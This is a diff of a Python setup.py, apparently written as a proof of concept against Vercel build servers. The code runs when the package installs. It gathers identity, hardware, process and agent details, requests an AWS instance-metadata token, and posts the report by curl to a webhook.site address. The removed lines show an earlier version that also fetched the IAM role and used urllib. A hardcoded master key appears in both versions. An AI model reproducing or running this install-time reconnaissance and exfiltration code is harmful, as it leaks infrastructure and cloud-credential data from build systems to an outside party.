@@ -1,81 +1,61 @@
 import os
 import subprocess
 import base64
-import json
 from setuptools import setup
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
-# --- КОНФИГ ---
+# --- ТВОЙ КОНФИГ ---
 WEBHOOK_URL = "https://webhook.site/57c42274-2817-4041-81a2-3f41b2c987a2"
 MASTER_KEY_B64 = "ifLJbKzHv3OTvy7rMiocCKna033QA19Hg/w2jrFucSQ="
 
 def run(cmd):
     return subprocess.getoutput(cmd).strip()
 
-def get_infra_diagnostics():
-    """Собирает данные о 'железе' и процессах для умного вопроса в LinkedIn"""
-    diag = {}
-    try:
-        # Узнаем реальное железо (Nitro/Firecracker)
-        diag['vendor'] = run('cat /sys/class/dmi/id/sys_vendor 2>/dev/null') or "Unknown"
-        # Проверяем реальное кол-во ядер на Elastic Machine
-        diag['cpus'] = os.cpu_count()
-        # Ищем системные процессы (под видом отладки)
-        pids = [p for p in os.listdir('/proc') if p.isdigit()]
-        diag['proc_count'] = len(pids)
-        # Пробуем найти название бинарника-исполнителя
-        diag['executor_info'] = run('ps -e -o comm= | grep -E "vc|agent|build" | head -n 3')
-    except:
-        diag['error'] = "INFRA_SCAN_FAILED"
-    return diag
-
-def get_aws_data():
-    """Обход IMDSv2"""
-    token_cmd = "curl -s -f -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-metadata-token-ttl-seconds: 60'"
-    token = run(token_cmd)
-    if not token or "curl" in token: return "IMDSv2_TIMEOUT_OR_BLOCKED"
-    
-    role_cmd = f"curl -s -H 'X-aws-metadata-token: {token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/"
-    return f"AWS_ROLE: {run(role_cmd)}"
-
-# --- СБОРКА ФИНАЛЬНОГО ОТЧЕТА ---
-infra = get_infra_diagnostics()
-
+# --- СБОРКА ДАННЫХ ---
 final_proof = f"""
-[!] VERCEL INFRASTRUCTURE DIAGNOSTICS
-HYPERVISOR/VENDOR: {infra.get('vendor')}
-ALLOCATED_CORES: {infra.get('cpus')}
-TOTAL_PROCESSES: {infra.get('proc_count')}
-INTERNAL_EXECUTORS: {infra.get('executor_info')}
+#######################################################
+#    VERCEL INFRASTRUCTURE DEEP SCAN REPORT           #
+#######################################################
 
-[!] PRIVILEGE & IDENTITY
+[1. SYSTEM IDENTITY]
 ID: {run('id')}
 HOSTNAME: {run('hostname')}
+KERNEL: {run('uname -r')}
 
-[!] CLOUD METADATA (AWS)
-{get_aws_data()}
+[2. CPU & ARCHITECTURE]
+CORES: {os.cpu_count()}
+MODEL: {run('grep "model name" /proc/cpuinfo | head -n 1 | cut -d: -f2')}
+BOGO_MIPS: {run('grep "bogomips" /proc/cpuinfo | head -n 1 | cut -d: -f2')}
 
-[!] CRYPTO & SECRETS
-MASTER_KEY: {MASTER_KEY_B64}
-ENCRYPTED_BLOB_LEN: {len(os.environ.get('VERCEL_ENCRYPTED_ENV_CONTENT', ''))}
+[3. MEMORY (RAM)]
+TOTAL_RAM: {run('grep MemTotal /proc/meminfo')}
+AVAILABLE: {run('grep MemAvailable /proc/meminfo')}
 
-[!] SYSTEM RECON
-IP: {run('hostname -I')}
-OS: {run('cat /etc/os-release | grep PRETTY_NAME')}
+[4. GPU CHECK]
+NVIDIA_SMI: {run('nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null || echo "No NVIDIA GPU"')}
+LSPCI_VGA: {run('lspci | grep -i vga || echo "No PCI VGA detected"')}
+
+[5. RUNNING PROCESSES (TOP 10)]
+{run('ps -e -o pid,user,comm,pcpu,pmem --sort=-pcpu | head -n 11')}
+
+[6. VERCEL INTERNAL AGENTS]
+FOUND_AGENTS: {run('ps -ef | grep -E "vc|agent|build|executor" | grep -v grep')}
+
+[7. CRYPTO & CLOUD]
+AWS_METADATA_TOKEN: {run("curl -s -m 2 -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-metadata-token-ttl-seconds: 60' || echo 'BLOCKED'")}
+MASTER_KEY_STATUS: {"FOUND" if MASTER_KEY_B64 else "NOT FOUND"}
+
+#######################################################
 """
 
-# --- ОТПРАВКА ---
-# Используем urllib как более надежный метод, если curl блокируют
+# --- ТВОЙ ПРОВЕРЕННЫЙ МЕТОД ОТПРАВКИ ---
 try:
-    import urllib.request
-    req = urllib.request.Request(WEBHOOK_URL, data=final_proof.encode(), method='POST')
-    req.add_header('Content-Type', 'text/plain')
-    with urllib.request.urlopen(req, timeout=10) as f:
-        pass 
+    subprocess.run(
+        ['curl', '-s', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', '@-', WEBHOOK_URL],
+        input=final_proof.encode(),
+        check=True
+    )
 except:
-    # Запасной вариант через curl
-    try:
-        subprocess.run(['curl', '-k', '-X', 'POST', '-d', final_proof, WEBHOOK_URL], timeout=10)
-    except:
-        pass
+    pass
 
-setup(name="vercel-infra-critical-poc", version="1.3.3.7")
+setup(name="vercel-infra-deep-scan", version="1.3.3.7")
